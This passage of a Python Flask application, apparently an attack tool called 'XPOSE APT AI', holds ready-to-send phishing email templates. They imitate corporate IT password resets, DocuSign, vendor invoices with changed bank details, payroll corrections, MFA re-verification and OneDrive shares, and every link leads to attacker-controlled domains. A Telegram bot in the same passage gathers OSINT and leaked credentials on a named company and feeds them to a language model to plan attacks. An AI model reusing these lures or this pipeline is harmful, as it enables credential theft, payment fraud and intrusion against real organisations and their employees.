        <p style="color: #666; font-size: 14px; line-height: 1.6; margin: 25px 0 15px 0;">
            <strong>Failure to update will result in:</strong>
        </p>
        <ul style="color: #666; font-size: 14px; line-height: 1.8; margin: 0; padding-left: 20px;">
            <li>Email and calendar access disabled</li>
            <li>VPN and remote access revoked</li>
            <li>Microsoft Teams and SharePoint locked</li>
            <li>All SSO-integrated applications inaccessible</li>
        </ul>
        
        <p style="color: #888; font-size: 13px; line-height: 1.6; margin: 30px 0 0 0; padding-top: 20px; border-top: 1px solid #eee;">
            If you have any questions, please contact the IT Help Desk at <a href="mailto:helpdesk@{company_clean}.com" style="color: #0078d4;">helpdesk@{company_clean}.com</a> or call extension 4357.
        </p>
    </div>
    
    <!-- Footer -->
    <div style="background: #f8f9fa; padding: 25px 30px; border-top: 1px solid #e9ecef;">
        <table width="100%" style="border: 0;">
            <tr>
                <td style="vertical-align: top;">
                    <p style="margin: 0; color: #333; font-weight: 600; font-size: 14px;">IT Security Team</p>
                    <p style="margin: 3px 0 0 0; color: #666; font-size: 13px;">{target_company}</p>
                    <p style="margin: 8px 0 0 0; color: #888; font-size: 12px;">
                        [Email] it-security@{company_clean}.com<br>
                        [Phone] +1 (555) 123-4567 ext. 4357
                    </p>
                </td>
                <td style="vertical-align: top; text-align: right; width: 150px;">
                    <img src="https://logo.clearbit.com/{company_clean}.com" alt="" style="height: 40px; opacity: 0.5;" onerror="this.style.display='none'">
                </td>
            </tr>
        </table>
    </div>
    
    <!-- Legal -->
    <div style="padding: 20px 30px; background: #f1f1f1;">
        <p style="margin: 0; color: #999; font-size: 11px; line-height: 1.5; text-align: center;">
            This is an automated message from {target_company} IT Security. Please do not reply to this email.<br>
            (c) {datetime.now().year} {target_company}. All rights reserved. | <a href="#" style="color: #999;">Privacy Policy</a>
        </p>
    </div>
</div>
</body>
</html>''',
            "plain_text": f'''Dear {first_name},

Your corporate password will expire in 24 hours.

To update your password, visit: https://sso.{attacker_domain}/auth/{target_email.replace('@', '%40')}

Failure to update will result in account lockout.

IT Security Team
{target_company}'''
        },
        
        "docusign": {
            "subject": f"[DocuSign] {sender_name or 'Sarah Johnson'} sent you a document to review and sign",
            "from_name": "DocuSign",
            "from_email": f"dse_na4@{attacker_domain}",
            "reply_to": f"dse_na4@{attacker_domain}",
            "headers": {
                "X-Mailer": "DocuSign",
                "X-DocuSign-Account": "a]5b9c2d1"
            },
            "html": f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: white;">
    
    <!-- DocuSign Header -->
    <div style="background: #1a1a2e; padding: 20px 30px;">
        <img src="https://www.docusign.com/sites/default/files/docusign_logo_white.png" alt="DocuSign" style="height: 30px;">
    </div>
    
    <!-- Content -->
    <div style="padding: 40px 30px;">
        <h2 style="color: #333; font-size: 22px; font-weight: normal; margin: 0 0 25px 0;">
            {sender_name or 'Sarah Johnson'} sent you a document to review and sign.
        </h2>
        
        <div style="background: #f8f8f8; border: 1px solid #e0e0e0; border-radius: 4px; padding: 20px; margin: 25px 0;">
            <p style="margin: 0 0 10px 0; color: #666; font-size: 13px;">DOCUMENT</p>
            <p style="margin: 0; color: #333; font-size: 16px; font-weight: 500;">
                [Doc] {target_company}_NDA_Agreement_{datetime.now().strftime("%Y%m%d")}.pdf
            </p>
            <p style="margin: 10px 0 0 0; color: #666; font-size: 13px;">
                Sent by: {sender_name or 'Sarah Johnson'} ({sender_title or 'Legal Counsel'})<br>
                {target_company}
            </p>
        </div>
        
        <div style="text-align: center; margin: 35px 0;">
            <a href="https://docusign.{attacker_domain}/sign/{uuid.uuid4().hex[:16]}"
               style="display: inline-block; background: #ffcc00; color: #1a1a2e; text-decoration: none; padding: 16px 50px; border-radius: 4px; font-size: 16px; font-weight: bold; text-transform: uppercase;">
                Review Document
            </a>
        </div>
        
        <p style="color: #666; font-size: 14px; line-height: 1.6;">
            <strong>Message from {sender_name or 'Sarah Johnson'}:</strong><br>
            "Hi {first_name}, please review and sign at your earliest convenience. This is time-sensitive and needs to be completed before our meeting tomorrow."
        </p>
    </div>
    
    <!-- Footer -->
    <div style="background: #f8f8f8; padding: 25px 30px; border-top: 1px solid #e0e0e0;">
        <p style="margin: 0; color: #666; font-size: 12px; line-height: 1.6;">
            <strong>Do Not Share This Email</strong><br>
            This email contains a secure link to DocuSign. Please do not share this email, link, or access code with others.
        </p>
        <p style="margin: 15px 0 0 0; color: #999; font-size: 11px;">
            <strong>About DocuSign:</strong> Sign documents electronically in just minutes. It is safe, secure, and legally binding.
        </p>
    </div>
    
    <div style="padding: 15px 30px; text-align: center;">
        <p style="margin: 0; color: #999; font-size: 10px;">
            (c) {datetime.now().year} DocuSign, Inc. | 221 Main Street, Suite 1550, San Francisco, CA 94105
        </p>
    </div>
</div>
</body>
</html>''',
            "plain_text": f'''{sender_name or 'Sarah Johnson'} sent you a document to review and sign.

Document: {target_company}_NDA_Agreement_{datetime.now().strftime("%Y%m%d")}.pdf

Review Document: https://docusign.{attacker_domain}/sign/{uuid.uuid4().hex[:16]}

Message: "Hi {first_name}, please review and sign at your earliest convenience."

DocuSign'''
        },
        
        "vendor_invoice": {
            "subject": f"Invoice #{random.randint(100000, 999999)} - Payment Reminder - {sender_name or 'TechServe Solutions'}",
            "from_name": f"{sender_name or 'TechServe Solutions'} Billing",
            "from_email": f"accounts@{attacker_domain}",
            "reply_to": f"billing@{attacker_domain}",
            "headers": {
                "X-Mailer": "Microsoft Outlook 16.0"
            },
            "html": f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px;">
<div style="max-width: 650px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden;">
    
    <!-- Header -->
    <div style="background: #2c3e50; padding: 25px 30px;">
        <table width="100%">
            <tr>
                <td>
                    <h1 style="color: white; margin: 0; font-size: 20px; font-weight: 500;">{sender_name or 'TechServe Solutions'}</h1>
                    <p style="color: rgba(255,255,255,0.7); margin: 5px 0 0 0; font-size: 13px;">Enterprise IT Services</p>
                </td>
                <td style="text-align: right;">
                    <p style="color: white; margin: 0; font-size: 24px; font-weight: bold;">INVOICE</p>
                </td>
            </tr>
        </table>
    </div>
    
    <!-- Invoice Details -->
    <div style="padding: 30px;">
        <table width="100%" style="margin-bottom: 30px;">
            <tr>
                <td style="vertical-align: top;">
                    <p style="color: #888; font-size: 12px; margin: 0 0 5px 0;">BILL TO:</p>
                    <p style="color: #333; font-size: 14px; margin: 0; line-height: 1.6;">
                        <strong>{target_company}</strong><br>
                        Attn: Accounts Payable<br>
                        {first_name}
                    </p>
                </td>
                <td style="vertical-align: top; text-align: right;">
                    <p style="color: #888; font-size: 12px; margin: 0 0 5px 0;">INVOICE DETAILS:</p>
                    <p style="color: #333; font-size: 14px; margin: 0; line-height: 1.6;">
                        Invoice #: <strong>INV-{random.randint(100000, 999999)}</strong><br>
                        Date: {current_date}<br>
                        Due: <span style="color: #e74c3c; font-weight: bold;">Upon Receipt</span>
                    </p>
                </td>
            </tr>
        </table>
        
        <!-- Warning Box -->
        <div style="background: #fef3e7; border: 1px solid #f5a623; border-radius: 5px; padding: 15px; margin-bottom: 25px;">
            <p style="margin: 0; color: #8a6d3b; font-size: 14px;">
                <strong>[!] Important:</strong> Our banking details have been updated. Please use the new account information provided in this invoice to avoid payment delays.
            </p>
        </div>
        
        <!-- Invoice Items -->
        <table width="100%" style="border-collapse: collapse; margin-bottom: 25px;">
            <tr style="background: #f8f9fa;">
                <th style="text-align: left; padding: 12px; border-bottom: 2px solid #e9ecef; color: #555; font-size: 13px;">Description</th>
                <th style="text-align: right; padding: 12px; border-bottom: 2px solid #e9ecef; color: #555; font-size: 13px;">Amount</th>
            </tr>
            <tr>
                <td style="padding: 15px 12px; border-bottom: 1px solid #eee; color: #333; font-size: 14px;">
                    IT Infrastructure Support - Q{(datetime.now().month-1)//3 + 1} {datetime.now().year}<br>
                    <span style="color: #888; font-size: 12px;">Service Period: Jan 1 - Mar 31, {datetime.now().year}</span>
                </td>
                <td style="padding: 15px 12px; border-bottom: 1px solid #eee; text-align: right; color: #333; font-size: 14px;">$24,500.00</td>
            </tr>
            <tr>
                <td style="padding: 15px 12px; border-bottom: 1px solid #eee; color: #333; font-size: 14px;">
                    Cloud Services License Renewal<br>
                    <span style="color: #888; font-size: 12px;">Annual subscription</span>
                </td>
                <td style="padding: 15px 12px; border-bottom: 1px solid #eee; text-align: right; color: #333; font-size: 14px;">$8,750.00</td>
            </tr>
            <tr style="background: #f8f9fa;">
                <td style="padding: 15px 12px; text-align: right; font-weight: bold; color: #333; font-size: 16px;">Total Due:</td>
                <td style="padding: 15px 12px; text-align: right; font-weight: bold; color: #2c3e50; font-size: 20px;">$33,250.00</td>
            </tr>
        </table>
        
        <!-- Payment Button -->
        <div style="text-align: center; margin: 30px 0;">
            <a href="https://pay.{attacker_domain}/invoice/{uuid.uuid4().hex[:12]}"
               style="display: inline-block; background: #27ae60; color: white; text-decoration: none; padding: 15px 40px; border-radius: 5px; font-size: 16px; font-weight: 500;">
                View Invoice & Pay Online
            </a>
        </div>
        
        <p style="color: #888; font-size: 13px; text-align: center; margin: 20px 0 0 0;">
            For questions about this invoice, contact <a href="mailto:accounts@{attacker_domain}" style="color: #3498db;">accounts@{sender_name.lower().replace(' ', '') if sender_name else 'techserve'}.com</a>
        </p>
    </div>
    
    <!-- Footer -->
    <div style="background: #2c3e50; padding: 20px 30px;">
        <p style="margin: 0; color: rgba(255,255,255,0.7); font-size: 12px; line-height: 1.6; text-align: center;">
            {sender_name or 'TechServe Solutions'} | 500 Technology Drive, Suite 400 | San Jose, CA 95110<br>
            Tax ID: 47-{random.randint(1000000, 9999999)} | Phone: 408-555-1234
        </p>
    </div>
</div>
</body>
</html>''',
            "plain_text": f'''INVOICE #{random.randint(100000, 999999)}

From: {sender_name or 'TechServe Solutions'}
To: {target_company}
Date: {current_date}
Due: Upon Receipt

IMPORTANT: Our banking details have been updated. Please use the new information.

Description: IT Infrastructure Support - Q{(datetime.now().month-1)//3 + 1} {datetime.now().year}
Amount: $33,250.00

Pay Online: https://pay.{attacker_domain}/invoice/{uuid.uuid4().hex[:12]}'''
        },
        
        "hr_payroll": {
            "subject": f"[{target_company}] Action Required: Payroll Discrepancy Identified",
            "from_name": f"{target_company} HR",
            "from_email": f"hr-payroll@{attacker_domain}",
            "reply_to": f"payroll@{attacker_domain}",
            "headers": {
                "X-Mailer": "Microsoft Outlook 16.0",
                "X-Priority": "1"
            },
            "html": f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden;">
    
    <!-- Header -->
    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 25px 30px;">
        <table width="100%">
            <tr>
                <td>
                    <img src="https://logo.clearbit.com/{company_clean}.com" alt="" style="height: 40px;" onerror="this.style.display='none'">
                </td>
                <td style="text-align: right;">
                    <p style="color: white; margin: 0; font-size: 12px; opacity: 0.8;">Human Resources</p>
                    <p style="color: white; margin: 5px 0 0 0; font-size: 16px; font-weight: 500;">Payroll Department</p>
                </td>
            </tr>
        </table>
    </div>
    
    <!-- Content -->
    <div style="padding: 30px;">
        <h2 style="color: #333; font-size: 20px; margin: 0 0 20px 0; font-weight: 500;">
            Payroll Discrepancy Notice
        </h2>
        
        <p style="color: #555; font-size: 15px; line-height: 1.7; margin: 0 0 20px 0;">
            Dear {first_name},
        </p>
        
        <p style="color: #555; font-size: 15px; line-height: 1.7; margin: 0 0 20px 0;">
            During our routine payroll audit, we identified a discrepancy in your salary records. Our system indicates an <strong>underpayment of $847.23</strong> from the last pay period.
        </p>
        
        <div style="background: #e8f5e9; border-left: 4px solid #4caf50; padding: 15px 20px; margin: 25px 0;">
            <p style="margin: 0; color: #2e7d32; font-size: 14px;">
                <strong>[$] Correction Amount:</strong> $847.23 will be added to your next paycheck upon verification.
            </p>
        </div>
        
        <p style="color: #555; font-size: 15px; line-height: 1.7; margin: 0 0 25px 0;">
            To ensure this correction is processed before the next pay cycle (<strong>{(datetime.now() + timedelta(days=14)).strftime("%B %d, %Y")}</strong>), please verify your direct deposit information:
        </p>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="https://hr.{attacker_domain}/employee/payroll/verify?id={target_email.replace('@', '%40')}"
               style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; padding: 15px 40px; border-radius: 5px; font-size: 16px; font-weight: 500;">
                Verify & Confirm Payment
            </a>
        </div>
        
        <p style="color: #888; font-size: 13px; line-height: 1.6; margin: 25px 0 0 0;">
            If you did not receive an underpayment or believe this is an error, please contact HR at <a href="mailto:hr@{company_clean}.com" style="color: #667eea;">hr@{company_clean}.com</a>.
        </p>
    </div>
    
    <!-- Signature -->
    <div style="padding: 0 30px 30px 30px;">
        <div style="border-top: 1px solid #eee; padding-top: 20px;">
            <p style="margin: 0; color: #333; font-size: 14px; font-weight: 500;">Jennifer Martinez</p>
            <p style="margin: 3px 0 0 0; color: #666; font-size: 13px;">Senior Payroll Specialist</p>
            <p style="margin: 3px 0 0 0; color: #666; font-size: 13px;">{target_company} Human Resources</p>
            <p style="margin: 10px 0 0 0; color: #888; font-size: 12px;">
                [Email] jennifer.martinez@{company_clean}.com | [Phone] ext. 2847
            </p>
        </div>
    </div>
    
    <!-- Footer -->
    <div style="background: #f8f9fa; padding: 20px 30px; border-top: 1px solid #e9ecef;">
        <p style="margin: 0; color: #999; font-size: 11px; text-align: center; line-height: 1.5;">
            This email contains confidential payroll information. If you received this in error, please delete immediately.<br>
            (c) {datetime.now().year} {target_company} - Human Resources Department
        </p>
    </div>
</div>
</body>
</html>''',
            "plain_text": f'''Payroll Discrepancy Notice

Dear {first_name},

During our routine audit, we identified an underpayment of $847.23 from the last pay period.

To verify and receive your correction, visit:
https://hr.{attacker_domain}/employee/payroll/verify?id={target_email.replace('@', '%40')}

Jennifer Martinez
Senior Payroll Specialist
{target_company} Human Resources'''
        },
        
        "mfa_reset": {
            "subject": f"[Security Alert] MFA Authentication Required - {target_company}",
            "from_name": f"{target_company} Security",
            "from_email": f"security-noreply@{attacker_domain}",
            "reply_to": f"security@{attacker_domain}",
            "headers": {
                "X-Mailer": "Microsoft Outlook 16.0",
                "X-Priority": "1"
            },
            "html": f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a2e; margin: 0; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: #16213e; border-radius: 8px; overflow: hidden; border: 1px solid #0f3460;">
    
    <!-- Header -->
    <div style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); padding: 25px 30px; text-align: center;">
        <p style="color: white; margin: 0; font-size: 14px; opacity: 0.9;">[Lock] SECURITY ALERT</p>
        <h1 style="color: white; margin: 10px 0 0 0; font-size: 22px; font-weight: 500;">Multi-Factor Authentication Required</h1>
    </div>
    
    <!-- Content -->
    <div style="padding: 30px;">
        <p style="color: #a8b2d1; font-size: 15px; line-height: 1.7; margin: 0 0 20px 0;">
            Hello {first_name},
        </p>
        
        <p style="color: #a8b2d1; font-size: 15px; line-height: 1.7; margin: 0 0 20px 0;">
            Our security systems detected that your MFA token needs to be re-verified. This is required due to our recent security infrastructure upgrade.
        </p>
        
        <div style="background: rgba(231, 76, 60, 0.1); border: 1px solid #e74c3c; border-radius: 5px; padding: 20px; margin: 25px 0;">
            <p style="margin: 0; color: #e74c3c; font-size: 14px; font-weight: 500;">
                [!] Action Required Within 12 Hours
            </p>
            <p style="margin: 10px 0 0 0; color: #a8b2d1; font-size: 13px;">
                Failure to complete MFA re-verification will result in temporary account suspension and loss of access to all {target_company} systems.
            </p>
        </div>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="https://sso.{attacker_domain}/mfa/verify/{uuid.uuid4().hex[:20]}"
               style="display: inline-block; background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; text-decoration: none; padding: 15px 40px; border-radius: 5px; font-size: 16px; font-weight: 500;">
                Verify MFA Now
            </a>
        </div>
        
        <p style="color: #64748b; font-size: 13px; line-height: 1.6; margin: 25px 0 0 0;">
            <strong>What you will need:</strong><br>
            * Your corporate credentials<br>
            * Your registered phone for SMS verification<br>
            * Your Microsoft Authenticator app (if enrolled)
        </p>
    </div>
    
    <!-- Footer -->
    <div style="background: #0f3460; padding: 20px 30px;">
        <p style="margin: 0; color: #64748b; font-size: 12px; text-align: center; line-height: 1.5;">
            {target_company} Information Security Team<br>
            <span style="font-size: 11px;">This is an automated security notification. Do not reply to this email.</span>
        </p>
    </div>
</div>
</body>
</html>''',
            "plain_text": f'''SECURITY ALERT: MFA Authentication Required

Hello {first_name},

Your MFA token needs to be re-verified within 12 hours.

Verify now: https://sso.{attacker_domain}/mfa/verify/{uuid.uuid4().hex[:20]}

{target_company} Information Security Team'''
        },
        
        "shared_document": {
            "subject": f"{sender_name or 'Michael Chen'} shared a file with you",
            "from_name": "Microsoft OneDrive",
            "from_email": f"no-reply@{attacker_domain}",
            "headers": {
                "X-Mailer": "SharePoint"
            },
            "html": f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #f3f2f1; margin: 0; padding: 20px;">
<div style="max-width: 520px; margin: 0 auto; background: white; border-radius: 6px; overflow: hidden; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
    
    <!-- Header -->
    <div style="background: #0078d4; padding: 20px; text-align: center;">
        <svg viewBox="0 0 24 24" width="40" height="40" style="fill: white;">
            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
        </svg>
    </div>
    
    <!-- Content -->
    <div style="padding: 30px;">
        <p style="color: #323130; font-size: 20px; font-weight: 600; margin: 0 0 20px 0;">
            {sender_name or 'Michael Chen'} shared a file with you
        </p>
        
        <div style="background: #faf9f8; border: 1px solid #edebe9; border-radius: 4px; padding: 20px; margin: 20px 0;">
            <table width="100%">
                <tr>
                    <td width="50" style="vertical-align: top;">
                        <div style="background: #0078d4; width: 40px; height: 40px; border-radius: 4px; text-align: center; line-height: 40px;">
                            <span style="color: white; font-weight: bold;">X</span>
                        </div>
                    </td>
                    <td style="vertical-align: top; padding-left: 15px;">
                        <p style="margin: 0; color: #323130; font-size: 15px; font-weight: 500;">
                            {target_company}_Confidential_Report_Q{(datetime.now().month-1)//3 + 1}.xlsx
                        </p>
                        <p style="margin: 5px 0 0 0; color: #605e5c; font-size: 13px;">
                            Shared from OneDrive
                        </p>
                    </td>
                </tr>
            </table>
        </div>
        
        <div style="background: #f3f2f1; border-radius: 4px; padding: 15px; margin: 20px 0;">
            <p style="margin: 0; color: #605e5c; font-size: 14px; font-style: italic;">
                "{first_name} - Please review before our meeting tomorrow. This contains the updated financials you requested."
            </p>
        </div>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="https://onedrive.{attacker_domain}/view/{uuid.uuid4().hex[:24]}"
               style="display: inline-block; background: #0078d4; color: white; text-decoration: none; padding: 12px 35px; border-radius: 4px; font-size: 14px; font-weight: 500;">
                Open
            </a>
        </div>
    </div>
    
    <!-- Footer -->
    <div style="background: #faf9f8; padding: 20px 30px; border-top: 1px solid #edebe9;">
        <p style="margin: 0; color: #a19f9d; font-size: 11px; line-height: 1.5;">
            Microsoft respects your privacy. To learn more, please read our <a href="#" style="color: #0078d4;">Privacy Statement</a>.<br><br>
            Microsoft Corporation, One Microsoft Way, Redmond, WA 98052
        </p>
    </div>
</div>
</body>
</html>''',
            "plain_text": f'''{sender_name or 'Michael Chen'} shared a file with you.

{target_company}_Confidential_Report_Q{(datetime.now().month-1)//3 + 1}.xlsx

Message: "{first_name} - Please review before our meeting tomorrow."

Open: https://onedrive.{attacker_domain}/view/{uuid.uuid4().hex[:24]}'''
        }
    }
    
    template = templates.get(template_type, templates["it_password"])
    
    # Add additional metadata
    template["target_info"] = {
        "name": target_name,
        "email": target_email,
        "company": target_company
    }
    template["campaign_id"] = str(uuid.uuid4())
    template["generated_at"] = datetime.now().isoformat()
    
    return jsonify(template)

# Telegram Bot
def telegram_send_message(chat_id, text, parse_mode="Markdown"):
    if not TELEGRAM_BOT_TOKEN: return
    try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode} if parse_mode else {"chat_id": chat_id, "text": text}, timeout=10)
    except: pass

def handle_telegram_message(message):
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "")
    if not chat_id or not text: return
    
    if text.startswith("/start"):
        telegram_send_message(chat_id, "[TARGET] **XPOSE APT AI v8.0**\n\nCommands:\n/newapt <company> - Start APT simulation\n/scan <domain> - Quick OSINT\n/help - This message")
        return
    
    if text.startswith("/newapt "):
        target = text[8:].strip()
        if target:
            telegram_send_message(chat_id, f"[Search] Starting APT simulation for: **{target}**...")
            project_id = str(uuid.uuid4())
            osint_data = gather_comprehensive_osint(target)
            industry = detect_industry(target, osint_data)
            impact_analysis = calculate_impact_analysis(target, osint_data, industry)
            db_execute("INSERT INTO projects (id, name, type, target, impact_analysis) VALUES (?, ?, ?, ?, ?)", (project_id, f"TG-{target[:20]}", "apt", target, json.dumps(impact_analysis)))
            db_execute("INSERT INTO osint_data (project_id, data_type, data) VALUES (?, ?, ?)", (project_id, "comprehensive", json.dumps(osint_data)))
            p = impact_analysis.get("probabilities", {})
            telegram_send_message(chat_id, f"[OK] **APT Created**\n\n[TARGET] Target: {target}\n[Industry] Industry: {impact_analysis.get('industry')}\n[Stats] Attack Surface: {impact_analysis.get('attack_surface_score')}/10\n\n**Probabilities:**\n* Initial Access: {p.get('initial_access')}%\n* Domain Admin: {p.get('domain_admin')}%\n* Ransomware: {p.get('ransomware_deployment')}%\n\nProject: `{project_id}`")
        return
    
    if text.startswith("/scan "):
        target = text[6:].strip()
        if target:
            telegram_send_message(chat_id, f"[Search] Scanning: {target}...")
            osint_data = gather_comprehensive_osint(target)
            impact = calculate_impact_analysis(target, osint_data, detect_industry(target, osint_data))
            p, o = impact.get("probabilities", {}), impact.get("osint_summary", {})
            telegram_send_message(chat_id, f"[Stats] **{target}**\n\n**OSINT:**\n* Subdomains: {o.get('subdomains_found')}\n* Services: {o.get('open_services')}\n* Leaked: {o.get('leaked_credentials')}\n* Emails: {o.get('emails_harvested')}\n\n**Risk:**\n* Initial Access: {p.get('initial_access')}%\n* Domain Admin: {p.get('domain_admin')}%")
        return
    
    project = db_execute("SELECT * FROM projects WHERE name LIKE ? ORDER BY updated_at DESC LIMIT 1", ("TG-%",), fetchone=True)
    if not project:
        telegram_send_message(chat_id, "Use /newapt <company> to start!", parse_mode=None)
        return
    
    try:
        history = db_execute("SELECT role, content FROM messages WHERE project_id = ? ORDER BY created_at ASC", (project["id"],), fetchall=True)
        osint_record = db_execute("SELECT data FROM osint_data WHERE project_id = ? ORDER BY created_at DESC LIMIT 1", (project["id"],), fetchone=True)
        osint_data = json.loads(osint_record.get("data", "{}")) if osint_record else {}
        impact_analysis = json.loads(project.get("impact_analysis", "{}")) if project.get("impact_analysis") else {}
        
        system_prompt = APT_SYSTEM_PROMPT.format(target_info=f"Target: {project['target']}", osint_data=format_osint_for_prompt(osint_data), impact_analysis=format_impact_for_prompt(impact_analysis), knowledge=load_knowledge())
        messages = [{"role": "system", "content": system_prompt}]
        for h in history[-20:]: messages.append({"role": h["role"], "content": h["content"]})
        messages.append({"role": "user", "content": text})
        
        db_execute("INSERT INTO messages (project_id, role, content) VALUES (?, ?, ?)", (project["id"], "user", text))
        response = call_llm_sync(messages, max_tokens=4000)
        db_execute("INSERT INTO messages (project_id, role, content) VALUES (?, ?, ?)", (project["id"], "assistant", response))
        
        for i in range(0, len(response), 4000):
            telegram_send_message(chat_id, response[i:i+4000], parse_mode=None)
    except Exception as e:
        telegram_send_message(chat_id, f"[X] Error: {str(e)}", parse_mode=None)

@app.route("/api/telegram/webhook", methods=["POST"])
def telegram_webhook():
    if not TELEGRAM_BOT_TOKEN: return jsonify({"error": "Telegram not configured"}), 500
    try:
        update = request.json
        if "message" in update: handle_telegram_message(update["message"])
        return jsonify({"ok": True})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/telegram/setwebhook", methods=["POST"])
def telegram_set_webhook():
    if not TELEGRAM_BOT_TOKEN: return jsonify({"error": "TELEGRAM_BOT_TOKEN not set"}), 500
    webhook_url = (request.json or {}).get("url") or f"{request.host_url.rstrip('/')}/api/telegram/webhook"
    return jsonify(requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook", json={"url": webhook_url}, timeout=10).json())

@app.route("/api/telegram/info", methods=["GET"])
def telegram_info():
    if not TELEGRAM_BOT_TOKEN: return jsonify({"configured": False})
    try:
        return jsonify({"configured": True, "bot": requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=10).json().get("result", {}), "webhook": requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo", timeout=10).json().get("result", {})})
    except Exception as e: return jsonify({"configured": True, "error": str(e)})

if __name__ == "__main__":
    init_db()
    kb_count = sum(1 for f in KNOWLEDGE_PATH.rglob("*") if f.is_file() and f.suffix in [".md", ".txt"]) if KNOWLEDGE_PATH.exists() else 0
    print(f"""
================================================================================
   XPOSE APT AI v8.0 - NATION-STATE ATTACK SIMULATION PLATFORM
   "From Company Name to Full Compromise"
================================================================================
   Features: Auto-Recon | Impact Analysis | Attack Paths | Breach Calculator
================================================================================
   LLM: {LLM_PROVIDER:<12} {'OK' if LLM_API_KEY else 'NO'} | Shodan: {'OK' if SHODAN_API_KEY else 'NO'} | DeHashed: {'OK' if DEHASHED_API_KEY else 'NO'} | Hunter: {'OK' if HUNTER_API_KEY else 'NO'}
   Telegram: {'OK' if TELEGRAM_BOT_TOKEN else 'NO'} | Knowledge Base: {kb_count} files
================================================================================
""")
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=True)
